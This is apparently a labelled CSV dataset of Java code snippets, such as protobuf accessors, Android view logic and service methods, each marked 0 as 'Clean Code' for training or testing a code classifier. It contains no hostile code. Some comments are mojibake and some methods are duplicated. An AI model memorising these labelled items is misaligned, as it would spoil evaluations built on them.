text,label,text_label
"/** 
 * <code>optional uint32 turn_counter = 1;</code>
 * @return whether the turnCounter field is set
 */
public boolean hasTurnCounter(){
  return (bitField0_ & 0x00000001) != 0;
}",0,Clean Code
"default void visit(ClickHouseBinaryComparisonOperation op){
}
default void visit(ClickHouseBinaryLogicalOperation op){
}
default void visit(ClickHouseUnaryPrefixOperation exp){
}
default void visit(ClickHouseUnaryPostfixOperation op){
}
default void visit(ClickHouseConstant c){
}
default void visit(ClickHouseSelect s,boolean inner){
}
default void visit(ClickHouseColumnReference columnReference){
}
default void visit(ClickHouseExpression.ClickHousePostfixText op){
}
void visit(ClickHouseTableReference tableReference);
void visit(ClickHouseCastOperation cast);
void visit(ClickHouseAliasOperation alias);
void visit(ClickHouseExpression.ClickHouseJoin join);
void visit(ClickHouseAggregate aggregate);
void visit(ClickHouseBinaryFunctionOperation func);
default void visit(ClickHouseExpression expr){
  if (expr instanceof ClickHouseBinaryFunctionOperation) {
    visit((ClickHouseBinaryFunctionOperation)expr);
  }
 else   if (expr instanceof ClickHouseBinaryComparisonOperation) {
    visit((ClickHouseBinaryComparisonOperation)expr);
  }
 else   if (expr instanceof ClickHouseBinaryLogicalOperation) {
    visit((ClickHouseBinaryLogicalOperation)expr);
  }
 else   if (expr instanceof ClickHouseConstant) {
    visit((ClickHouseConstant)expr);
  }
 else   if (expr instanceof ClickHouseUnaryPrefixOperation) {
    visit((ClickHouseUnaryPrefixOperation)expr);
  }
 else   if (expr instanceof ClickHouseSelect) {
    visit((ClickHouseSelect)expr,true);
  }
 else   if (expr instanceof ClickHouseColumnReference) {
    visit((ClickHouseColumnReference)expr);
  }
 else   if (expr instanceof ClickHouseTableReference) {
    visit((ClickHouseTableReference)expr);
  }
 else   if (expr instanceof ClickHouseCastOperation) {
    visit((ClickHouseCastOperation)expr);
  }
 else   if (expr instanceof ClickHouseExpression.ClickHouseJoin) {
    visit((ClickHouseExpression.ClickHouseJoin)expr);
  }
 else   if (expr instanceof ClickHouseExpression.ClickHousePostfixText) {
    visit((ClickHouseExpression.ClickHousePostfixText)expr);
  }
 else   if (expr instanceof ClickHouseAggregate) {
    visit((ClickHouseAggregate)expr);
  }
 else   if (expr instanceof ClickHouseAliasOperation) {
    visit((ClickHouseAliasOperation)expr);
  }
 else   if (expr instanceof ClickHouseExpression.ClickHouseJoinOnClause) {
    visit((ClickHouseExpression.ClickHouseJoinOnClause)expr);
  }
 else {
    throw new AssertionError(expr);
  }
}
",0,Clean Code
"public Builder seed(Long seed){
  this.seed=seed;
  return this;
}
",0,Clean Code
"private final long syncTimer(long startMS){
  if (mInSeekingAction || mInSyncAction) {
    return 0;
  }
  mInSyncAction=true;
  long d=0;
  long time=startMS - mTimeBase;
  if (mNonBlockModeEnable) {
    if (mCallback != null) {
      mCallback.updateTimer(timer);
      d=timer.lastInterval();
    }
  }
 else   if (!mDanmakusVisible || mRenderingState.nothingRendered || mInWaitingState) {
    timer.update(time);
    mRemainingTime=0;
    if (mCallback != null) {
      mCallback.updateTimer(timer);
    }
  }
 else {
    long gapTime=time - timer.currMillisecond;
    long averageTime=Math.max(mFrameUpdateRate,getAverageRenderingTime());
    if (gapTime > 2000 || mRenderingState.consumingTime > mCordonTime || averageTime > mCordonTime) {
      d=gapTime;
      gapTime=0;
    }
 else {
      d=averageTime + gapTime / mFrameUpdateRate;
      d=Math.max(mFrameUpdateRate,d);
      d=Math.min(mCordonTime,d);
      long a=d - mLastDeltaTime;
      if (a > 3 && a < 8 && mLastDeltaTime >= mFrameUpdateRate && mLastDeltaTime <= mCordonTime) {
        d=mLastDeltaTime;
      }
      gapTime-=d;
      mLastDeltaTime=d;
    }
    mRemainingTime=gapTime;
    timer.add(d);
    if (mCallback != null) {
      mCallback.updateTimer(timer);
    }
  }
  mInSyncAction=false;
  return d;
}",0,Clean Code
"/** 
 * <code>optional uint32 dice_branch_id = 1;</code>
 * @param value the diceBranchId to set
 * @return this
 */
public ChessRogueNousDice setDiceBranchId(final int value){
  bitField0_|=0x00000001;
  diceBranchId=value;
  return this;
}",0,Clean Code
"@Override public final LanguageType forName(final CharSequence value){
  if (value.length() == 11) {
    if (ProtoUtil.isEqual(""LANGUAGE_SC"",value)) {
      return LANGUAGE_SC;
    }
    if (ProtoUtil.isEqual(""LANGUAGE_TC"",value)) {
      return LANGUAGE_TC;
    }
    if (ProtoUtil.isEqual(""LANGUAGE_EN"",value)) {
      return LANGUAGE_EN;
    }
    if (ProtoUtil.isEqual(""LANGUAGE_KR"",value)) {
      return LANGUAGE_KR;
    }
    if (ProtoUtil.isEqual(""LANGUAGE_JP"",value)) {
      return LANGUAGE_JP;
    }
    if (ProtoUtil.isEqual(""LANGUAGE_FR"",value)) {
      return LANGUAGE_FR;
    }
    if (ProtoUtil.isEqual(""LANGUAGE_DE"",value)) {
      return LANGUAGE_DE;
    }
    if (ProtoUtil.isEqual(""LANGUAGE_ES"",value)) {
      return LANGUAGE_ES;
    }
    if (ProtoUtil.isEqual(""LANGUAGE_PT"",value)) {
      return LANGUAGE_PT;
    }
    if (ProtoUtil.isEqual(""LANGUAGE_RU"",value)) {
      return LANGUAGE_RU;
    }
    if (ProtoUtil.isEqual(""LANGUAGE_TH"",value)) {
      return LANGUAGE_TH;
    }
    if (ProtoUtil.isEqual(""LANGUAGE_VI"",value)) {
      return LANGUAGE_VI;
    }
    if (ProtoUtil.isEqual(""LANGUAGE_ID"",value)) {
      return LANGUAGE_ID;
    }
  }
  if (value.length() == 13) {
    if (ProtoUtil.isEqual(""LANGUAGE_NONE"",value)) {
      return LANGUAGE_NONE;
    }
  }
  return null;
}",0,Clean Code
"public Builder maxTokens(Integer maxTokens){
  this.maxTokens=maxTokens;
  return this;
}
public Builder maxTokens(Integer maxTokens){
  this.maxTokens=maxTokens;
  return this;
}
public Builder maxTokens(Integer maxTokens){
  this.maxTokens=maxTokens;
  return this;
}
public Builder maxTokens(Integer maxTokens){
  this.maxTokens=maxTokens;
  return this;
}
",0,Clean Code
"public String getType(){
  return this.type;
}
",0,Clean Code
"private void doMotion(MotionEvent event){
  if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
    return;
  }
switch (event.getActionMasked()) {
case MotionEvent.ACTION_BUTTON_PRESS:
    sendKeyEvent(mapCovert(event.getActionButton()),true,type2);
  break;
case MotionEvent.ACTION_BUTTON_RELEASE:
sendKeyEvent(mapCovert(event.getActionButton()),false,type2);
break;
case MotionEvent.ACTION_SCROLL:
String keyName;
if (event.getAxisValue(MotionEvent.AXIS_VSCROLL) > 0) {
keyName=MouseMap.MOUSEMAP_WHEEL_UP;
}
 else {
keyName=MouseMap.MOUSEMAP_WHEEL_DOWN;
}
sendKeyEvent(keyName,true,type2);
sendKeyEvent(keyName,false,type2);
break;
case MotionEvent.ACTION_HOVER_ENTER:
case MotionEvent.ACTION_HOVER_MOVE:
case MotionEvent.ACTION_HOVER_EXIT:
case MotionEvent.ACTION_MOVE:
if (mController.isGrabbed()) {
sendPointerInc((int)event.getAxisValue(MotionEvent.AXIS_X) * CURSOR_EXTRA_GRABBED,(int)event.getAxisValue(MotionEvent.AXIS_Y) * CURSOR_EXTRA_GRABBED);
}
 else {
sendPointerInc((int)event.getAxisValue(MotionEvent.AXIS_X) * CURSOR_EXTRA_RELEASE,(int)event.getAxisValue(MotionEvent.AXIS_Y) * CURSOR_EXTRA_RELEASE);
}
break;
}
}",0,Clean Code
"@Override public boolean onPreferenceTreeClick(Preference preference){
  if (preference != mAppSelector) {
    editActionIntSharedPrefs(getAction(preference));
  }
 else {
    Intent intent=new Intent(getActivity(),SubPickerActivity.class);
    intent.putExtra(""mode"",AppPicker.CALLBACK_MODE);
    startActivityForResult(intent,0);
  }
  return true;
}",0,Clean Code
"private void addSubmenuEntries(){
  add(newWorkspaceMenuItem);
  add(loadWorkspaceMenuItem);
  add(closeWorkspaceMenuItem);
  addRecentWorkspaces();
  if (exitMenuItem != null) {
    add(new JSeparator());
    add(exitMenuItem);
  }
}
",0,Clean Code
"@Override public RogueRecordInfo clone(){
  return new RogueRecordInfo().copyFrom(this);
}
",0,Clean Code
"public GGProAVRoomOptPushInfo(GProAVRoomOptPushInfo gProAVRoomOptPushInfo){
  this.mInfo=gProAVRoomOptPushInfo;
}
",0,Clean Code
"@EventHandler public void onKey(KeyEvent event){
  if (Input.isKeyPressed(GLFW.GLFW_KEY_F3))   return;
  if (checkGuiMove())   return;
  boolean cancel=true;
  if (mc.options.forwardKey.matchesKey(event.key,0)) {
    forward=event.action != KeyAction.Release;
    mc.options.forwardKey.setPressed(false);
  }
 else   if (mc.options.backKey.matchesKey(event.key,0)) {
    backward=event.action != KeyAction.Release;
    mc.options.backKey.setPressed(false);
  }
 else   if (mc.options.rightKey.matchesKey(event.key,0)) {
    right=event.action != KeyAction.Release;
    mc.options.rightKey.setPressed(false);
  }
 else   if (mc.options.leftKey.matchesKey(event.key,0)) {
    left=event.action != KeyAction.Release;
    mc.options.leftKey.setPressed(false);
  }
 else   if (mc.options.jumpKey.matchesKey(event.key,0)) {
    up=event.action != KeyAction.Release;
    mc.options.jumpKey.setPressed(false);
  }
 else   if (mc.options.sneakKey.matchesKey(event.key,0)) {
    down=event.action != KeyAction.Release;
    mc.options.sneakKey.setPressed(false);
  }
 else {
    cancel=false;
  }
  if (cancel)   event.cancel();
}",0,Clean Code
"public Duration getTaskExecutionPostponeDuration(){
  return taskExecutionPostponeDuration;
}
",0,Clean Code
"/** 
 * 鏂板淇濆瓨瑙掕壊淇℃伅
 * @param role 瑙掕壊淇℃伅
 * @return 缁撴灉
 */
int insertRole(SysRoleEntity role);
",0,Clean Code
"public static OggTestFile generate(Random random,int pageCount){
  ArrayList<byte[]> fileData=new ArrayList<>();
  int fileSize=0;
  int granuleCount=0;
  int firstPayloadPageSize=0;
  int firstPayloadPageGranuleCount=0;
  int lastPageloadPageSize=0;
  int lastPayloadPageGranuleCount=0;
  int packetLength=-1;
  for (int i=0; i < pageCount; i++) {
    int headerType=0x00;
    if (packetLength >= 0) {
      headerType|=1;
    }
    if (i == 0) {
      headerType|=2;
    }
    if (i == pageCount - 1) {
      headerType|=4;
    }
    int pageGranuleCount=random.nextInt(MAX_GRANULES_IN_PAGE - 1) + 1;
    int pageSegmentCount=random.nextInt(MAX_SEGMENT_COUNT);
    granuleCount+=pageGranuleCount;
    byte[] header=OggTestData.buildOggHeader(headerType,granuleCount,0,pageSegmentCount);
    fileData.add(header);
    int pageSize=header.length;
    byte[] laces=new byte[pageSegmentCount];
    int bodySize=0;
    for (int j=0; j < pageSegmentCount; j++) {
      if (packetLength < 0) {
        if (i < pageCount - 1) {
          packetLength=random.nextInt(MAX_PACKET_LENGTH);
        }
 else {
          int maxPacketLength=255 * (pageSegmentCount - j) - 1;
          packetLength=random.nextInt(maxPacketLength);
        }
      }
 else       if (i == pageCount - 1 && j == pageSegmentCount - 1) {
        packetLength=Math.min(packetLength,254);
      }
      laces[j]=(byte)Math.min(packetLength,255);
      bodySize+=laces[j] & 0xFF;
      packetLength-=255;
    }
    fileData.add(laces);
    pageSize+=laces.length;
    byte[] payload=TestUtil.buildTestData(bodySize,random);
    fileData.add(payload);
    pageSize+=payload.length;
    fileSize+=pageSize;
    if (i == 0) {
      firstPayloadPageSize=pageSize;
      firstPayloadPageGranuleCount=pageGranuleCount;
    }
 else     if (i == pageCount - 1) {
      lastPageloadPageSize=pageSize;
      lastPayloadPageGranuleCount=pageGranuleCount;
    }
  }
  byte[] file=new byte[fileSize];
  int position=0;
  for (  byte[] data : fileData) {
    System.arraycopy(data,0,file,position,data.length);
    position+=data.length;
  }
  return new OggTestFile(file,granuleCount,pageCount,firstPayloadPageSize,firstPayloadPageGranuleCount,lastPageloadPageSize,lastPayloadPageGranuleCount);
}",0,Clean Code
"public ArrayList<GProLiveAnchorPlayStream> getStreams(){
  return this.streams;
}
",0,Clean Code
"/** 
 * @param value The numeric wire value of the corresponding enum entry.
 * @param other Fallback value in case the value is not known.
 * @return The enum associated with the given numeric wire value, or the fallback value if unknown.
 */
public static RogueCommonActionResultDisplayType forNumberOr(int number,RogueCommonActionResultDisplayType other){
  RogueCommonActionResultDisplayType value=forNumber(number);
  return value == null ? other : value;
}
",0,Clean Code
"@Override protected void onMeasure(int widthSpec,int heightSpec){
  if (mImageTexture == null) {
    super.onMeasure(widthSpec,heightSpec);
  }
 else {
    float ratio=(float)mTextureWidth / mTextureHeight;
    int widthSize=MeasureSpec.getSize(widthSpec);
    int heightSize=MeasureSpec.getSize(heightSpec);
    int widthMode=MeasureSpec.getMode(widthSpec);
    int heightMode=MeasureSpec.getMode(heightSpec);
    int measureWidth=-1;
    int measureHeight=-1;
    if (widthMode == MeasureSpec.EXACTLY) {
      measureWidth=widthSize;
      if (heightMode == MeasureSpec.EXACTLY) {
        measureHeight=heightSize;
      }
 else {
        measureHeight=(int)(widthSize / ratio);
        if (heightMode == MeasureSpec.AT_MOST) {
          measureHeight=Math.min(measureHeight,heightSize);
        }
      }
    }
 else     if (heightMode == MeasureSpec.EXACTLY) {
      measureHeight=heightSize;
      measureWidth=(int)(heightSize * ratio);
      if (widthMode == MeasureSpec.AT_MOST) {
        measureWidth=Math.min(measureWidth,widthSize);
      }
    }
    if (measureWidth == -1 || measureHeight == -1) {
      super.onMeasure(widthSpec,heightSpec);
    }
 else {
      setMeasuredSize(measureWidth,measureHeight);
    }
  }
}",0,Clean Code
"public int getRequestRetryCount(){
  return requestRetryCount;
}
",0,Clean Code
"@Override public Object visitModuleType(ModuleTypeContext ctx){
  return new UnresolvedTypeNode.Module(createSourceSection(ctx));
}
",0,Clean Code
"@Override public TableMeta getTableMeta(String databaseName,String schemaName,String tableName){
  return null;
}
",0,Clean Code
"public NodesIterator getNeighborsIterator(int node){
  var neighbors=getNeighbors(node);
  assert neighbors != null : ""Node "" + node + "" not found"";
  return neighbors.iterator();
}
",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)32);
    output.writeUInt32NoTag(uid);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)72);
    output.writeBoolNoTag(handleResult);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeRawByte((byte)26);
    output.writeMessageNoTag(handleFriendInfo);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.uid,uid);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeBool(FieldNames.handleResult,handleResult);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeMessage(FieldNames.handleFriendInfo,handleFriendInfo);
  }
  output.endObject();
}",0,Clean Code
"/** 
 * @return the clientApp
 */
public String getClientApp(){
  return clientApp;
}
",0,Clean Code
"public @Nullable Package getPackage(){
  return pkg;
}
",0,Clean Code
"@Override public void execute(final CEdgeHoverState state,final MouseEvent event){
}
",0,Clean Code
"public abstract SingleGraph getPrimaryGraph();
",0,Clean Code
"/** 
 * 鍏叡閫�娆炬帴鍙�
 */
@PostMapping(""/api/ticket-service/ticket/refund"") public Result<RefundTicketRespDTO> commonTicketRefund(@RequestBody RefundTicketReqDTO requestParam){
  return Results.success(ticketService.commonTicketRefund(requestParam));
}
",0,Clean Code
"public PacketSceneCastSkillMpUpdateScNotify(int attackedGroupId,int mp){
  super(CmdId.SceneCastSkillMpUpdateScNotify);
  var data=SceneCastSkillMpUpdateScNotify.newInstance().setAttackedGroupId(attackedGroupId).setMp(mp);
  this.setData(data);
}
",0,Clean Code
"/** 
 * Configures the excluded Inference metadata keys to filter out from the generative.
 * @param excludedInferenceMetadataKeys Excluded inference metadata keys to use.
 * @return this builder
 */
public Builder withExcludedInferenceMetadataKeys(List<String> excludedInferenceMetadataKeys){
  Assert.notNull(excludedInferenceMetadataKeys,""Excluded inference metadata keys must not be null"");
  this.excludedInferenceMetadataKeys=excludedInferenceMetadataKeys;
  return this;
}
public Builder withExcludedInferenceMetadataKeys(String... keys){
  Assert.notNull(keys,""Excluded inference metadata keys must not be null"");
  this.excludedInferenceMetadataKeys.addAll(Arrays.asList(keys));
  return this;
}
",0,Clean Code
"@Override public void switchToFront(){
}
void switchToFront();
",0,Clean Code
"private HashMap unmarshal(InputStream in) throws Exception {
  byte[] header=new byte[4 + 1];
  readFull(in,header);
  ByteBuffer bb=ByteBuffer.wrap(header);
  int len=bb.getInt();
  int x=bb.get();
  if (len > 1024 * 1024 * 32) {
    throw new IOException(""invalid len"");
  }
  byte[] bs=new byte[len];
  readFull(in,bs);
  for (int i=0; i < bs.length; i++) {
    bs[i]=(byte)(bs[i] ^ x);
  }
  HashMap m=new HashMap();
  byte[] buf;
  for (int i=0; i < bs.length - 1; ) {
    short kLen=bs[i];
    i+=1;
    if (i + kLen >= bs.length) {
      throw new Exception(""key len error"");
    }
    if (kLen < 0) {
      throw new Exception(""key len error"");
    }
    buf=copyOfRange(bs,i,i + kLen);
    String key=new String(buf);
    i+=kLen;
    if (i + 4 >= bs.length) {
      throw new Exception(""value len error"");
    }
    buf=copyOfRange(bs,i,i + 4);
    int vLen=bytesToU32(buf);
    i+=4;
    if (vLen < 0) {
      throw new Exception(""value error"");
    }
    if (i + vLen > bs.length) {
      throw new Exception(""value error"");
    }
    byte[] value=copyOfRange(bs,i,i + vLen);
    i+=vLen;
    m.put(key,value);
  }
  return m;
}",0,Clean Code
"private int calculateFrequency(String str){
  int frequency=0;
  for (int i=0; i < searchTerm.length(); i++) {
    char ch=searchTerm.charAt(i);
    String chStr=String.valueOf(ch);
    if (str.contains(chStr)) {
      frequency=frequency + 1;
    }
  }
  return frequency;
}",0,Clean Code
"@NonNull public static String getSoftInputString(int flag){
  StringBuilder builder=new StringBuilder();
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_ADJUST_NOTHING) != 0)   builder.append(""Adjust nothing, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_ADJUST_PAN) != 0)   builder.append(""Adjust pan, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE) != 0)   builder.append(""Adjust resize, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_ADJUST_UNSPECIFIED) != 0)   builder.append(""Adjust unspecified, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN) != 0)   builder.append(""Always hidden, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_VISIBLE) != 0)   builder.append(""Always visible, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_STATE_HIDDEN) != 0)   builder.append(""Hidden, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_STATE_VISIBLE) != 0)   builder.append(""Visible, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_STATE_UNCHANGED) != 0)   builder.append(""Unchanged, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_STATE_UNSPECIFIED) != 0)   builder.append(""Unspecified, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_IS_FORWARD_NAVIGATION) != 0)   builder.append(""ForwardNav, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_MASK_ADJUST) != 0)   builder.append(""Mask adjust, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_MASK_STATE) != 0)   builder.append(""Mask state, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_MODE_CHANGED) != 0)   builder.append(""Mode changed, "");
  checkStringBuilderEnd(builder);
  String result=builder.toString();
  return result.isEmpty() ? ""null"" : result;
}",0,Clean Code
"/** 
 * <code>optional .DisplayEquipmentInfo equipment = 2;</code>
 * @return this
 */
public DisplayAvatarDetailInfo clearEquipment(){
  bitField0_&=~0x00000080;
  equipment.clear();
  return this;
}",0,Clean Code
"public ArrayList<GProGuildMsg> getResults(){
  return this.results;
}
",0,Clean Code
"public static String finishTask(String sceneCode,String taskType){
  String outBizNo=taskType + ""_"" + RandomUtils.nextDouble();
  return RpcUtil.request(""com.alipay.antiep.finishTask"",""[{\""outBizNo\"":\"""" + outBizNo + ""\"",\""requestType\"":\""H5\"",\""sceneCode\"":\""""+ sceneCode+ ""\"",\""source\"":\""ANTFOREST\"",\""taskType\"":\""""+ taskType+ ""\""}]"");
}",0,Clean Code
"private void log(String line){
  if (line.startsWith(""Metaspace       used""))   return;
  if (line.startsWith(""class space    used""))   return;
  if (line.startsWith(""par new generation   total""))   return;
  if (line.startsWith(""concurrent-mark-sweep perm gen total""))   return;
  if (line.startsWith(""(cardTable: ""))   return;
  if (line.startsWith(""def new generation   total""))   return;
  if (line.contains(""CMSCMS: Large block""))   return;
  LOGGER.log(Level.WARNING,""Missed: {0}"",line);
}",0,Clean Code
"@Override @Transactional(rollbackFor=Exception.class) public OperationLog addOrUpdateLeaveInformation(HrmEmployeeQuitInfo quitInfo){
  HrmEmployee employee;
  OperationLog operationLog=new OperationLog();
  if (quitInfo.getQuitInfoId() == null) {
    boolean exists=quitInfoService.lambdaQuery().eq(HrmEmployeeQuitInfo::getEmployeeId,quitInfo.getEmployeeId()).exists();
    if (exists) {
      throw new CrmException(HrmCodeEnum.THE_EMPLOYEE_HAS_ALREADY_HANDLED_THE_RESIGNATION);
    }
    Content content=employeeActionRecordService.quitRecord(quitInfo);
    employee=employeeService.getById(quitInfo.getEmployeeId());
    quitInfo.setOldStatus(employee.getStatus());
    operationLog.setOperationObject(quitInfo.getEmployeeId(),employee.getEmployeeName());
    operationLog.setOperationInfo(content.getDetail());
  }
 else {
    employee=new HrmEmployee();
    employee.setEmployeeId(quitInfo.getEmployeeId());
    HrmEmployeeQuitInfo old=quitInfoService.getById(quitInfo.getQuitInfoId());
    HrmEmployee hrmEmployee=employeeService.getById(quitInfo.getEmployeeId());
    operationLog.setOperationObject(hrmEmployee.getEmployeeId(),hrmEmployee.getEmployeeName());
    Content content=employeeActionRecordService.entityUpdateRecord(LabelGroupEnum.QUIT,BeanUtil.beanToMap(old),BeanUtil.beanToMap(quitInfo),quitInfo.getEmployeeId());
    operationLog.setOperationInfo(content.getDetail());
  }
  LocalDateTime planQuitTime=quitInfo.getPlanQuitTime().atStartOfDay();
  EmployeeEntryStatus entryStatus;
  if (LocalDateTimeUtil.toEpochMilli(planQuitTime) > System.currentTimeMillis()) {
    entryStatus=EmployeeEntryStatus.TO_LEAVE;
  }
 else {
    entryStatus=EmployeeEntryStatus.ALREADY_LEAVE;
    if (ObjectUtil.isNotNull(employee.getCompanyAgeStartTime())) {
      long nowCompanyAge=LocalDateTimeUtil.between(employee.getCompanyAgeStartTime().atStartOfDay(),LocalDateTime.now()).toDays() + 1;
      employee.setCompanyAge(Convert.toInt(nowCompanyAge));
    }
    abnormalChangeRecordService.addAbnormalChangeRecord(quitInfo.getEmployeeId(),AbnormalChangeType.RESIGNATION,quitInfo.getPlanQuitTime().atStartOfDay());
  }
  employee.setEntryStatus(entryStatus.getValue());
  employeeService.updateById(employee);
  quitInfoService.saveOrUpdate(quitInfo);
  return operationLog;
}",0,Clean Code
"/** 
 * <code>optional uint32 level = 3;</code>
 * @param value the level to set
 * @return this
 */
public Equipment setLevel(final int value){
  bitField0_|=0x00000002;
  level=value;
  return this;
}",0,Clean Code
"@Override public int compare(final ISortableTreeNode o1,final ISortableTreeNode o2){
  int value=0;
  final IAddress addr1=o1.getAddress();
  final IAddress addr2=o2.getAddress();
  value=addr1.compareTo(addr2);
  if (order == ESortOrder.DESCENDING) {
    value*=-1;
  }
  return value;
}",0,Clean Code
"/** 
 * A SearchScoreProvider for a single-pass search based on exact similarity. Generally only suitable when your RandomAccessVectorValues is entirely in-memory, e.g. during construction.
 */
public static SearchScoreProvider exact(VectorFloat<?> v,VectorSimilarityFunction vsf,RandomAccessVectorValues ravv){
  var sf=ScoreFunction.Reranker.from(v,vsf,ravv);
  return new SearchScoreProvider(sf);
}
",0,Clean Code
"private void invalidateChatListViewTopPadding(){
  if (!invalidateChatListViewTopPadding) {
    invalidateChatListViewTopPadding=true;
    if (contentView != null) {
      contentView.invalidate();
    }
    if (chatListView != null) {
      chatListView.invalidate();
    }
  }
  int topPanelHeight=topChatPanelView != null && topChatPanelView.getVisibility() == View.VISIBLE ? ((topChatPanelView.getLayoutParams() == null ? AndroidUtilities.dp(50) : topChatPanelView.getLayoutParams().height) - AndroidUtilities.dp(2)) : 0;
  topPanelHeight=topPanelHeight + (int)Math.max(-topPanelHeight,topChatPanelViewOffset);
  float translation=contentPanTranslation + contentPaddingTop + Math.max(0,topPanelHeight);
  if (pinnedMessageView != null) {
    translation+=pinnedMessageEnterOffset;
    pinnedMessageView.setTranslationY(translation);
    translation+=AndroidUtilities.dp(48);
  }
  View pendingRequestsView=pendingRequestsDelegate != null ? pendingRequestsDelegate.getView() : null;
  if (pendingRequestsView != null) {
    translation+=pendingRequestsDelegate.getViewEnterOffset();
    pendingRequestsView.setTranslationY(translation);
  }
  float p=actionBarSearchTags != null ? actionBarSearchTags.getCurrentHeight() : 0;
  if (fragmentContextView != null) {
    float from=0;
    if (fragmentLocationContextView != null && fragmentLocationContextView.getVisibility() == View.VISIBLE) {
      from+=AndroidUtilities.dp(36);
    }
    fragmentContextView.setTranslationY(contentPanTranslation + p + from+ fragmentContextView.getTopPadding());
  }
  if (fragmentLocationContextView != null) {
    float from=0;
    if (fragmentContextView != null && fragmentContextView.getVisibility() == View.VISIBLE) {
      from+=AndroidUtilities.dp(fragmentContextView.getStyleHeight()) + fragmentContextView.getTopPadding();
    }
    fragmentLocationContextView.setTranslationY(contentPanTranslation + p + from+ fragmentLocationContextView.getTopPadding());
  }
  if (topChatPanelView != null) {
    topChatPanelView.setTranslationY(contentPanTranslation + p + contentPaddingTop+ topChatPanelViewOffset);
  }
  if (alertView != null && alertView.getVisibility() == View.VISIBLE) {
    alertView.setTranslationY(contentPanTranslation + p + contentPaddingTop - AndroidUtilities.dp(50) * (1f - alertViewEnterProgress));
  }
  if (bottomOverlayChat != null) {
    bottomOverlayChat.setTranslationY(bottomPanelTranslationYReverse);
  }
  if (bottomMessagesActionContainer != null) {
    bottomMessagesActionContainer.setTranslationY(bottomPanelTranslationYReverse);
  }
  if (undoView != null) {
    undoView.setAdditionalTranslationY(chatActivityEnterView.getHeightWithTopView() - chatActivityEnterView.getAnimatedTop());
  }
}",0,Clean Code
"public MemorySegmentReader(Path path) throws IOException {
  arena=Arena.ofShared();
  try (var ch=FileChannel.open(path,StandardOpenOption.READ)){
    memory=ch.map(MapMode.READ_ONLY,0L,ch.size(),arena);
  }
 catch (  Exception e) {
    arena.close();
    throw e;
  }
}
MemorySegmentReader(Arena arena,MemorySegment memory){
  this.arena=arena;
  this.memory=memory;
}",0,Clean Code
"@TruffleBoundary public static Object readMember(VmObjectLike receiver,Object memberKey){
  var result=readMemberOrNull(receiver,memberKey);
  if (result != null)   return result;
  throw new VmExceptionBuilder().cannotFindMember(receiver,memberKey).build();
}
@TruffleBoundary public static Object readMember(VmObjectLike receiver,Object memberKey,IndirectCallNode callNode){
  var result=readMemberOrNull(receiver,memberKey,true,callNode);
  if (result != null)   return result;
  throw new VmExceptionBuilder().cannotFindMember(receiver,memberKey).withLocation(callNode).build();
}
",0,Clean Code
